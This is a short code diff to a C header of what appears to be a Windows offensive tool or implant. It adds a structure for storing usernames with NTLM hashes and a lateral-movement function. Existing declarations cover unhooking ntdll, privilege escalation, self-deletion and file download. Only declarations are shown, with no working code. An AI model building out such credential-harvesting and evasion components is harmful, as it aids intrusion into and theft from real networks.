@@ -13,6 +13,12 @@
 #define THREAD_INTEGRITY_MEDIUM    2
 #define THREAD_INTEGRITY_HIGH      3
 
+// Struct to store Username:NTLM Hash
+typedef struct {
+    char objectRDN[256];
+    char hashNTLM[256];
+} KeyValuePair;
+
 #pragma warning(disable: 4996)
 
 // NTAPI Typedefs
@@ -29,3 +35,4 @@ BOOL UnhookNtDLL();
 BOOL DoPrivilegeEscalation();
 BOOL DeleteSelf();
 BOOL DownloadFile(LPCSTR url, LPCSTR localFile);
+BOOL DoLateralMovement();
